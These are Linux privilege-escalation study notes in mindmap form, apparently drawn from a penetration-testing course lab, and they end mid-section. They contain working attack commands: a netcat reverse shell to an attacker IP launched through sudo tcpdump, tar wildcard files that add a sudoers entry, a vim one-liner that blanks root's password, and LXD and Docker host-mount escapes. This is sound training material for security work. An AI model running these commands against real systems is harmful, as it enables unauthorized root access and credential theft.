---

mindmap-plugin: basic

---
# Linux Privilege Escalation
## 1. Introduction to Linux Privilege Escalation
#### **2. Enumeration**

##### **2.1 OS Version**
- **Purpose:** Identify the distribution and version of the operating system to check for potential public exploits.
- **Details:** Knowing the OS version helps in determining the available tools and possible vulnerabilities.

##### **2.2 Kernel Version**
- **Purpose:** Identify the kernel version to find possible kernel exploits.
- **Details:** Kernel exploits can cause system instability; caution is advised when using them.

##### **2.3 Running Services**
- **Purpose:** Identify services running on the host, especially those running as root.
- **Details:** Misconfigured or vulnerable services can be leveraged for privilege escalation.
- **Command Example:** `ps aux | grep root`

##### **2.4 Installed Packages and Versions**
- **Purpose:** Check for out-of-date or vulnerable packages.
- **Details:** Vulnerabilities in installed software like Screen can be exploited for privilege escalation.

##### **2.5 Logged in Users**
- **Purpose:** Identify currently logged-in users and their activities.
- **Details:** This information can help in local lateral movement and privilege escalation.
- **Command Example:** `ps au`

##### **2.6 User Home Directories**
- **Purpose:** Check the accessibility of other users' home directories.
- **Details:** Home directories may contain SSH keys, credentials, or scripts that can be leveraged.
- **Command Example:** `ls /home`

##### **2.7 SSH Directory Contents**
- **Purpose:** Check for SSH keys that could be used for further access.
- **Details:** SSH keys can be leveraged for stable, interactive sessions or access to other systems.
- **Command Example:** `ls -l ~/.ssh`

##### **2.8 Bash History**
- **Purpose:** Review a user's bash history for potential passwords or activities.
- **Details:** Bash history may reveal passwords, cron jobs, or other useful information.
- **Command Example:** `history`

##### **2.9 Sudo Privileges**
- **Purpose:** Check if the user can run any commands as another user or as root.
- **Details:** Identifying NOPASSWD sudo privileges can allow privilege escalation without a password.
- **Command Example:** `sudo -l`

##### **2.10 Configuration Files**
- **Purpose:** Search for usernames, passwords, and other secrets in configuration files.
- **Details:** Configuration files can hold sensitive information that aids in privilege escalation.

##### **2.11 Readable Shadow File**
- **Purpose:** Check if the shadow file is readable to gather password hashes.
- **Details:** Password hashes can be subjected to offline brute-force attacks.

##### **2.12 Password Hashes in /etc/passwd**
- **Purpose:** Identify any password hashes in the /etc/passwd file.
- **Details:** Hashes in this file can be cracked offline, though this configuration is rare.
- **Command Example:** `cat /etc/passwd`

##### **2.13 Cron Jobs**
- **Purpose:** Identify scheduled tasks that can be leveraged for privilege escalation.
- **Details:** Misconfigurations in cron jobs can be exploited to elevate privileges.
- **Command Example:** `ls -la /etc/cron.daily/`

##### **2.14 Unmounted File Systems and Additional Drives**
- **Purpose:** Discover and mount additional drives to find sensitive files.
- **Details:** These may contain backups or sensitive data useful for privilege escalation.
- **Command Example:** `lsblk`

##### **2.15 SETUID and SETGID Permissions**
- **Purpose:** Identify binaries with SETUID and SETGID permissions that can be exploited.
- **Details:** Exploiting these permissions can grant root-level access without needing full root access.

##### **2.16 Writable Directories**
- **Purpose:** Discover writable directories for downloading tools or exploiting cron jobs.
- **Details:** Writable directories may indicate opportunities to elevate privileges.
- **Command Example:** `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`

##### **2.17 Writable Files**
- **Purpose:** Identify world-writable scripts or configuration files.
- **Details:** These files can be modified to introduce commands that escalate privileges.
- **Command Example:** `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`

#### **3. Moving on**
- **Purpose:** Understand the importance of manual enumeration techniques for privilege escalation.
- **Details:** The next sections will cover various techniques to perform local privilege escalation on Linux.
## Information Gathering
### Environment Enumeration
##### **Enumeration Basics**
- **Purpose:** Understand key details of the host for privilege escalation and system understanding.
- **Description:** Enumeration is critical for identifying potential privilege escalation vectors. Various tools and scripts like LinPEAS and LinEnum can help automate this process, but manual enumeration is essential for a thorough understanding.

##### **OS Version**
- **Purpose:** Identify the Linux distribution and version to check for public exploits and available tools.
- **Command Example:** `cat /etc/os-release`
- **Example Output:**
    ```
    NAME="Ubuntu"
    VERSION="20.04.4 LTS (Focal Fossa)"
    ```

##### **Kernel Version**
- **Purpose:** Identify the kernel version to find possible kernel exploits.
- **Command Example:** `uname -a`
- **Example Output:**     Linux nixlpe02 5.4.0-122-generic # 138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
    ```

    ```

##### **Running Services**
- **Purpose:** Identify services running on the host, especially those running as root, for potential privilege escalation.
- **Command Example:** `ps aux | grep root`

##### **User and Group Information**
- **Purpose:** Gather details on the users and groups configured on the system, which may provide insight into privilege escalation opportunities.
- **Command Example:** `cat /etc/passwd`
- **Example Output:**
    ```
    root:x:0:0:root:/root:/bin/bash
    mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
    ```

##### **User Login Shells**
- **Purpose:** Identify the shells available on the system, which can be exploited if outdated or misconfigured.
- **Command Example:** `grep "*sh$" /etc/passwd`
- **Example Output:**
    ```
    root:x:0:0:root:/root:/bin/bash
    mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
    ```

##### **Existing Groups**
- **Purpose:** Understand the group memberships, which can indicate potential privilege escalation paths.
- **Command Example:** `cat /etc/group`
- **Example Output:**
    ```
    sudo:x:27:mrb3n,htb-student
    ```

##### **Home Directories**
- **Purpose:** Identify and enumerate the home directories of users, potentially finding sensitive information or credentials.
- **Command Example:** `ls /home`
- **Example Output:**
    ```
    administrator.ilfreight  bjones  htb-student  mrb3n  stacey.jenkins
    ```

##### **Mounted File Systems**
- **Purpose:** Identify mounted file systems to discover sensitive files or potential privilege escalation paths.
- **Command Example:** `df -h`
- **Example Output:**
    ```
    Filesystem      Size  Used Avail Use% Mounted on
    /dev/sda5        20G  7.9G   11G  44% /
    ```

##### **Unmounted File Systems**
- **Purpose:** Identify and potentially mount unmounted file systems that could contain sensitive information.
- **Command Example:** `cat /etc/fstab | grep -v "#" | column -t`

##### **Hidden Files and Directories**
- **Purpose:** Locate hidden files and directories that could contain sensitive information or be used for privilege escalation.
- **Command Example:** `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student`

##### **Temporary Files**
- **Purpose:** Identify temporary files that might contain sensitive information or be leveraged for privilege escalation.
- **Command Example:** `ls -l /tmp /var/tmp /dev/shm`

##### **Network Configuration**
- **Purpose:** Enumerate network interfaces and routing tables to understand network topology and potential lateral movement.
- **Command Example:** `route`
- **Example Output:**
    ```
    Kernel IP routing table
    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
    default         _gateway        0.0.0.0         UG    0      0        0 ens192
    ```

##### **ARP Table**
- **Purpose:** Identify other hosts on the network that the target machine has been communicating with.
- **Command Example:** `arp -a`
- **Example Output:**
    ```
    _gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192
    ```

### Linux Services & Internals Enumeration
##### **Overview**
- **Purpose:** Dig deeper into the host's operating system internals to uncover information about services, users, network interfaces, and other system configurations.
- **Description:** This phase focuses on gathering detailed information about the running services, applications, users, network configurations, and other internals to inform potential privilege escalation paths.

##### **Network Interfaces**
- **Purpose:** Identify network interfaces and their configurations to understand the system's network topology.
- **Command Example:** `ip a`
- **Example Output:**
    ```
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192
    ```

##### **Hosts File**
- **Purpose:** Check the `/etc/hosts` file for any interesting entries that could indicate internal or external connections.
- **Command Example:** `cat /etc/hosts`
- **Example Output:**
    ```
    127.0.0.1 localhost
    127.0.1.1 nixlpe02
    ```

##### **User's Last Login**
- **Purpose:** Determine when users last logged in to assess the system's usage and identify active users.
- **Command Example:** `lastlog`
- **Example Output:**
    ```
    mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022
    ```

##### **Logged In Users**
- **Purpose:** Identify currently logged-in users to understand the system's current state and active sessions.
- **Command Example:** `w`
- **Example Output:**
    ```
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
    ```

##### **Command History**
- **Purpose:** Review the command history of users to uncover potential misconfigurations or sensitive data, such as passwords.
- **Command Example:** `history`
- **Example Output:**
    ```
    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    ```

##### **Finding History Files**
- **Purpose:** Locate special history files created by scripts or programs that may contain sensitive information.
- **Command Example:** `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`
- **Example Output:**
    ```
    -rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
    ```

##### **Cron Jobs**
- **Purpose:** Identify scheduled cron jobs that might be exploitable for privilege escalation.
- **Command Example:** `ls -la /etc/cron.daily/`
- **Example Output:**
    ```
    -rwxr-xr-x  1 root root  376 Dec  4  2019 apport
    -rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
    ```

##### **Proc Filesystem**
- **Purpose:** Access information about system processes, hardware, and other internals using the proc filesystem.
- **Command Example:** `find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`

##### **Installed Packages**
- **Purpose:** List installed packages to check for outdated or vulnerable software.
- **Command Example:** `apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list`
- **Example Output:**
    ```
    accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1
    accountsservice 0.6.55-0ubuntu12~20.04.5
    ```

##### **Sudo Version**
- **Purpose:** Check the sudo version to see if it is vulnerable to any known exploits.
- **Command Example:** `sudo -V`
- **Example Output:**
    ```
    Sudo version 1.8.31
    Sudoers policy plugin version 1.8.31
    ```

##### **Binaries**
- **Purpose:** List binaries present on the system, which might be exploitable, especially if they are outdated.
- **Command Example:** `ls -l /bin /usr/bin/ /usr/sbin/`

##### **GTFObins**
- **Purpose:** Compare installed binaries with those listed on GTFObins to identify potential privilege escalation vectors.
- **Command Example:** 
    ```
    for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
    ```
- **Example Output:**
    ```
    Check GTFO for: bash
    Check GTFO for: curl
    ```

##### **Trace System Calls**
- **Purpose:** Use `strace` to monitor system calls and signals, potentially uncovering sensitive operations.
- **Command Example:** `strace ping -c1 10.129.112.20`
- **Example Output:**
    ```
    execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], 0x7ffdc8b96cc0 /* 80 vars */) = 0
    socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3
    ```

##### **Configuration Files**
- **Purpose:** Locate and analyze configuration files for sensitive information or misconfigurations.
- **Command Example:** `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`
- **Example Output:**
    ```
    -rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf
    ```

##### **Scripts**
- **Purpose:** Find and analyze scripts on the system that might reveal internal processes or be exploitable.
- **Command Example:** `find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"`
- **Example Output:**
    ```
    /home/htb-student/automation.sh
    /etc/wpa_supplicant/action_wpa.sh
    ```

##### **Running Services by User**
- **Purpose:** Identify services running as root or other users to find potential privilege escalation paths.
- **Command Example:** `ps aux | grep root`
- **Example Output:**
    ```
    root           1  2.0  0.2 168196 11364 ?        Ss   12:31   0:01 /sbin/init splash
    ```

This overview of the system’s internals gives us a detailed understanding of the environment, preparing us for further exploration and potential privilege escalation opportunities.

### Credential Hunting

##### **Overview**
- **Purpose:** Identify and extract credentials stored within various files on a system. These credentials can be used for privilege escalation, accessing databases, or moving laterally within the environment.
- **Description:** Credentials can be found in configuration files, shell scripts, bash history, backup files, database files, and even plain text files. Identifying and utilizing these credentials is crucial for escalating privileges or gaining access to other systems.

##### **Finding Credentials in Configuration Files**
- **Purpose:** Locate credentials stored in configuration files, which are often used to store database connections, application settings, and other sensitive information.
- **Command Example:** `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`
- **Example Output:**
    ```
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /etc/python3/debian_config
    /etc/kbd/config
    /boot/config-4.4.0-116-generic
    /boot/grub/i386-pc/configfile.mod
    ```

##### **Example of Database Credentials in Configuration Files**
- **Purpose:** Extract specific credentials, such as database usernames and passwords, from configuration files.
- **Command Example:** `cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'`
- **Example Output:**
    ```
    define( 'DB_USER', 'wordpressuser' );
    define( 'DB_PASSWORD', 'WPadmin123!' );
    ```

##### **Searching for SSH Keys**
- **Purpose:** Locate SSH private keys, which can be used to gain access to other user accounts or systems with additional privileges.
- **Description:** SSH private keys may be stored in home directories or other accessible locations. Finding these keys and correlating them with entries in the `known_hosts` file can help identify potential targets for lateral movement.
- **Command Example:** Search for private keys:
    ```
    find / -type f -iname "*id_rsa" -exec ls -l {} \; 2>/dev/null
    ```
- **Example Output:**
    ```
    -rw------- 1 user user 1679 Mar  5 09:19 /home/user/.ssh/id_rsa
    ```

##### **Checking the Known Hosts File**
- **Purpose:** Use the `known_hosts` file to identify other hosts that the user has previously connected to, which could be useful for lateral movement.
- **Command Example:** 
    ```
    cat ~/.ssh/known_hosts
    ```
- **Example Output:**
    ```
    [192.168.1.10]:22 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA1
    [10.0.0.1]:22 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDa...
    ```

##### **Mail and Spool Directories**
- **Purpose:** Explore mail and spool directories, which might contain emails with sensitive information, including credentials.
- **Description:** These directories can sometimes store automated emails from applications or services that include credentials or other valuable information.
- **Command Example:** 
    ```
    ls /var/mail/
    ls /var/spool/
    ```

## Environment-based Privilege Escalation
### Path Abuse
##### **Overview**
- **Purpose:** Exploit the PATH environment variable to execute malicious scripts or binaries instead of legitimate system commands.
- **Description:** The PATH environment variable specifies the directories where the system looks for executables. By manipulating this variable, an attacker can execute a malicious script with the same name as a legitimate command, gaining unauthorized access or privileges.

##### **Viewing the Current PATH Variable**
- **Purpose:** Check the current directories listed in the PATH variable.
- **Command Example:** `echo $PATH`
- **Example Output:**
    ```
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    ```

##### **Executing a Script in a PATH Directory**
- **Purpose:** Demonstrate that a script placed in a directory specified in the PATH variable can be executed from any location.
- **Command Example:**
    ```
    pwd && conncheck
    ```
- **Example Output in `/usr/local/sbin`:**
    ```
    /usr/local/sbin
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
    tcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
    tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
    tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2    
    ```
- **Example Output in `/tmp`:**
    ```
    /tmp
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
    tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
    tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
    tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2     
    ```

##### **Modifying the PATH Variable**
- **Purpose:** Add the current working directory to the PATH variable, enabling the execution of scripts from the current directory without specifying the full path.
- **Command Example:**
    ```
    PATH=.:${PATH}
    export PATH
    ```
- **Example Output:**
    ```
    .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    ```

##### **Creating a Malicious Script to Exploit PATH Abuse**
- **Purpose:** Replace a legitimate command like `ls` with a malicious script to demonstrate PATH abuse.
- **Command Example:**
    ```
    touch ls
    echo 'echo "PATH ABUSE!!"' > ls
    chmod +x ls
    ```
- **Example Output when Running the `ls` Command:**
    ```
    PATH ABUSE!!
    ```

### Wildcard Abuse
##### **Overview**
- **Purpose:** Exploit wildcard characters to manipulate commands or files in unexpected ways, potentially gaining unauthorized access or escalating privileges.
- **Description:** Wildcards like `*`, `?`, `[]`, and `~` can be used in various ways by attackers to execute commands or manipulate files. Understanding how wildcards are processed by the shell can reveal vulnerabilities in scripts or commands.

##### **Wildcard Characters**
- **`*`**: Matches any number of characters.
- **`?`**: Matches a single character.
- **`[]`**: Matches any one of the characters inside the brackets.
- **`~`**: Expands to the user's home directory or another user's home directory.
- **`-`**: Denotes a range of characters within brackets.

##### **Exploiting Wildcards with `tar` Command**
- **Purpose:** Use the `tar` command's `--checkpoint-action` option to execute arbitrary commands when certain conditions are met.
- **Example:**
    ```
    man tar
    ```
  - Look for `--checkpoint-action` and `--checkpoint` options in the `tar` command's manual.

##### **Setup for Exploitation**
- **Scenario:** A cron job runs `tar` to back up files every minute. By creating specific filenames with wildcards, an attacker can exploit the `--checkpoint-action` option to execute arbitrary commands.
- **Cron Job Example:**
    ```
    */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
    ```
  - This cron job creates a backup of `/home/htb-student` directory every minute.

##### **Creating Malicious Files**
- **Commands:**
    ```
    echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
    echo "" > "--checkpoint-action=exec=sh root.sh"
    echo "" > --checkpoint=1
    ```
  - **Explanation:** 
    - `root.sh` contains a command to add `htb-student` user to the sudoers file with root privileges.
    - `--checkpoint-action=exec=sh root.sh` and `--checkpoint=1` are filenames that will be interpreted as arguments to `tar`.

##### **Verifying Files**
- **Command:**
    ```
    ls -la
    ```
  - **Example Output:**
    ```
    total 56
    drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
    drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
    -rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
    -rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
    -rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
    drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
    drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
    -rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
    ```

##### **Checking Privileges**
- **Command:**
    ```
    sudo -l
    ```
  - **Example Output:**
    ```
    Matching Defaults entries for htb-student on NIX02:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User htb-student may run the following commands on NIX02:
        (root) NOPASSWD: ALL
    ```


### Escaping Restricted Shells

##### **Overview**
- **Purpose:** Methods to bypass limitations imposed by restricted shells to gain more control or access on a system.
- **Description:** Restricted shells (e.g., rbash, rksh, rzsh) limit user actions to prevent system damage or unauthorized access. However, certain techniques can potentially escape these restrictions.

##### **Types of Restricted Shells**
- **RBASH (Restricted Bourne Shell):**
  - Limits changing directories, modifying environment variables, and executing commands outside specified directories.
- **RKSH (Restricted Korn Shell):**
  - Restricts commands, shell functions, and environment modifications.
- **RZSH (Restricted Z Shell):**
  - Limits running scripts, defining aliases, and modifying environment variables.

##### **Escaping Methods**

1. **Command Injection:**
   - **Description:** Inject additional commands into arguments of allowed commands.
   - **Example:**
     ```
     M0n0l1th6@htb[/htb]$ ls -l `pwd`
     ```
   - **Explanation:** Executes `pwd` command within the `ls` command’s argument, revealing the current directory despite restrictions.

2. **Command Substitution:**
   - **Description:** Use backticks or other substitution syntax to run commands indirectly.
   - **Example:**
     ```
     M0n0l1th6@htb[/htb]$ echo `whoami`
     ```
   - **Explanation:** `whoami` is executed inside the backticks, showing the current user.

3. **Command Chaining:**
   - **Description:** Chain multiple commands using shell metacharacters like `;` or `|`.
   - **Example:**
     ```
     M0n0l1th6@htb[/htb]$ ls -l ; whoami
     ```
   - **Explanation:** Runs `ls -l` followed by `whoami`, bypassing restrictions on the second command.

4. **Environment Variables:**
   - **Description:** Modify environment variables to alter command execution paths.
   - **Example:**
     ```
     M0n0l1th6@htb[/htb]$ export PATH=/home/user/bin:$PATH
     ```
   - **Explanation:** Changes `PATH` to include a user directory where custom scripts or binaries can be placed.

5. **Shell Functions:**
   - **Description:** Define shell functions to execute restricted commands.
   - **Example:**
     ```
     M0n0l1th6@htb[/htb]$ function escape() { /bin/bash; }
     M0n0l1th6@htb[/htb]$ escape
     ```
   - **Explanation:** Defines a function that executes a non-restricted shell, providing more control.

##### **Use Case Scenario**
- **Context:** An IT team uses restricted shells for users to limit their actions and enhance security.
- **Example:** Users with restricted access might try these methods to bypass shell limitations and gain broader system access.

By understanding and utilizing these methods, one can potentially escape from restricted shells and access broader functionalities on a system, highlighting the importance of properly securing and monitoring user environments.
## Permissions-based Privilege Escalation
### Special Permissions
##### **Overview**
- **Set User ID (setuid):** Allows a program to run with the privileges of the file owner, usually root, regardless of who executes it. The setuid bit appears as `s` in the file permissions.
- **Set Group ID (setgid):** Allows a program to run with the privileges of the group that owns the file. The setgid bit appears as `s` in the file permissions.

##### **Examples of Special Permissions**

**1. Set User ID (setuid):**
- **Command to List setuid Files:**
  ```bash
  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
  ```
- **Common setuid Files:**
  ```
  -rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
  -rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
  -rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
  -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
  -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
  -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
  -rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
  -rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
  -rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
  -rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
  ```
- **Exploitation:** Reverse engineer setuid programs to find vulnerabilities that can be exploited to escalate privileges.

**2. Set Group ID (setgid):**
- **Command to List setgid Files:**
  ```bash
  find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
  ```
- **Common setgid Files:**
  ```
  -rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
  ```
- **Exploitation:** Similar to setuid, but exploits involve running binaries as if the user were part of the group that owns the file.

##### **GTFOBins**
- **Description:** GTFOBins is a curated list of binaries and scripts that can be exploited to bypass security restrictions, escalate privileges, or execute commands in restricted environments.
- **Example:**
  ```bash
  sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
  # id
  uid=0(root) gid=0(root) groups=0(root)
  ```
- **Purpose:** Familiarize yourself with GTFOBins to identify potential misconfigurations and escalate privileges effectively.

Understanding and leveraging setuid and setgid permissions, along with resources like GTFOBins, can be crucial for privilege escalation and system exploitation during penetration testing.
### Sudo Rights Abuse

#### **Overview**
Sudo allows users to execute commands with elevated privileges. The configuration for sudo privileges is managed in the `/etc/sudoers` file. Misconfigurations in sudo privileges can lead to privilege escalation if users are granted excessive permissions, especially with options like `NOPASSWD`.

#### **Checking Sudo Privileges**
- **Command to List Sudo Privileges:**
  ```bash
  sudo -l
  ```
  **Example Output:**
  ```
  User sysadm may run the following commands on NIX02:
      (root) NOPASSWD: /usr/sbin/tcpdump
  ```

#### **Abusing Sudo Rights**
1. **Misconfigured Commands:**
   - Users might have sudo access to commands without a password prompt (`NOPASSWD`), which can be misconfigured to run commands with unintended capabilities.
   
2. **Example Exploitation:**
   - **Vulnerable Command:** If `tcpdump` is allowed with `NOPASSWD`, it can be exploited using the `-z` option to execute a shell script.
   - **Command for Exploitation:**
     ```bash
     sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
     ```
   - **Create a Reverse Shell Script:**
     ```bash
     echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f' > /tmp/.test
     ```

3. **Executing the Exploit:**
   - **Start a Netcat Listener:**
     ```bash
     nc -lnvp 443
     ```
   - **Run the Exploitation Command:**
     ```bash
     sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
     ```
   - **Result:**
     - If successful, a reverse shell will connect back to the attacker’s system.

#### **Preventive Measures**
1. **Specify Absolute Paths:**
   - Always use the absolute path for binaries in the `/etc/sudoers` file to avoid PATH abuse.
   - **Example:** Use `/bin/cat` instead of `cat` in sudoers entries.

2. **Least Privilege Principle:**
   - Grant minimal sudo rights necessary for the user’s job.
   - Avoid broad or unnecessary sudo privileges to reduce the risk of privilege escalation.

#### **Best Practices**
- Review and audit sudo permissions regularly.
- Ensure that configurations are precise and do not allow unintended command execution.
- Stay aware of security features in distributions, such as AppArmor, that might restrict command execution in specific contexts.

Understanding and correctly configuring sudo permissions are crucial for maintaining system security and preventing privilege escalation.
### Privileged Groups
#### **LXC / LXD**
LXD is Ubuntu's container manager, similar to Docker, and adding users to the LXD group grants significant privileges. Members can escalate privileges by creating a privileged LXD container, which allows access to the host filesystem.

1. **Check Group Membership:**
   ```bash
   id
   ```
   **Example Output:**
   ```
   uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
   ```

2. **Unzip Alpine Image:**
   ```bash
   unzip alpine.zip
   ```

3. **Initialize LXD:**
   ```bash
   lxd init
   ```
   Choose defaults or configure as needed.

4. **Import Local Image:**
   ```bash
   lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
   ```

5. **Start a Privileged Container:**
   ```bash
   lxc init alpine r00t -c security.privileged=true
   ```

6. **Mount Host Filesystem:**
   ```bash
   lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
   ```

7. **Spawn a Shell Inside the Container:**
   ```bash
   lxc start r00t
   lxc exec r00t /bin/sh
   ```
   **Browse Host Filesystem:**
   ```bash
   cd /mnt/root/root
   ```

#### **Docker**
Users in the Docker group can access the filesystem by running Docker containers. For example, running a Docker container with a volume mounted from `/root` allows access to the host's root directory.

1. **Run a Docker Container with Host Volume:**
   ```bash
   docker run -v /root:/mnt -it ubuntu
   ```

2. **Access Mounted Directory:**
   - Inside the container, navigate to `/mnt` to access files from `/root` on the host.

#### **Disk Group**
Members of the disk group have access to devices in `/dev`, such as `/dev/sda1`. This can be exploited to access the filesystem with root-level privileges.

1. **Use Debugfs to Access Filesystem:**
   ```bash
   debugfs /dev/sda1
   ```
   - Explore the filesystem to retrieve sensitive files or modify contents.

#### **ADM Group**
Members of the adm group can read logs in `/var/log`. This access doesn’t grant root privileges directly but can be used to gather sensitive information.

1. **Check Group Membership:**
   ```bash
   id
   ```
   **Example Output:**
   ```
   uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
   ```

### **Summary**
- **LXC / LXD:** Privileged containers can access host filesystems.
- **Docker:** Users can mount host directories and access sensitive data.
- **Disk:** Access to `/dev` devices allows filesystem exploration.
- **ADM:** Access to logs can provide sensitive information.

Understanding these group memberships and their associated privileges is critical for identifying potential privilege escalation paths.
### Capabilities
#### **Common Capabilities:**
- **cap_sys_admin:** Broad administrative privileges, including modifying system files and settings.
- **cap_sys_chroot:** Allows changing the root directory for the current process.
- **cap_sys_ptrace:** Allows debugging other processes.
- **cap_sys_nice:** Allows adjusting process priorities.
- **cap_sys_time:** Allows modifying the system clock.
- **cap_sys_resource:** Allows modifying system resource limits.
- **cap_sys_module:** Allows loading and unloading kernel modules.
- **cap_net_bind_service:** Allows binding to network ports.

#### **Setting Capabilities:**
Use the `setcap` command to assign specific capabilities to executables: sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic

This command allows `/usr/bin/vim.basic` to bind to network ports, a privilege typically restricted.

#### **Capability Values:**
- **`= [cap]`**: Sets the capability but grants no privileges.
- **`+ep`**: Grants effective and permitted privileges.
- **`+ei`**: Grants inheritable and effective privileges.
- **`+p`**: Grants permitted privileges.

#### **Enumerating Capabilities:**
To find executables with specific capabilities, use: find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

**Example Output:** 
- /usr/bin/vim.basic cap_dac_override=eip
- /usr/bin/ping cap_net_raw=ep
- /usr/bin/mtr-packet cap_net_raw=ep


#### **Exploitation Example:**
If you have access to a low-privilege account and discover a binary with `cap_dac_override` capability, you can exploit it to modify system files.

1. **Check Capabilities:**    getcap /usr/bin/vim.basic

   **Example Output:**    /usr/bin/vim.basic cap_dac_override=eip

2. **Exploit Capability:**
   Modify system files using `vim.basic` with the `cap_dac_override` capability:    /usr/bin/vim.basic /etc/passwd
   To perform the modification in a non-interactive mode:    echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

3. **Verify Changes:**    cat /etc/passwd | head -n1
   **Example Output:**    root::0:0:root:/root:/bin/bash
## Service-based Privilege Escalation
### LXD

##### **1.1. Containers**
- **Description:** Operate at the OS level, share the same OS, and isolate application processes.
- **Advantages:**
  - More resource-efficient
  - Provide isolation without running a full OS for each container

##### **1.2. Virtual Machines**
- **Description:** Operate at the hardware level, allowing multiple OSes to run simultaneously on a single system.

#### **2. Linux Containers (LXC)**

##### **2.1. LXC**
- **Description:** Allows multiple Linux systems to run in isolation on a single host by sharing the host's kernel.
- **Advantages:**
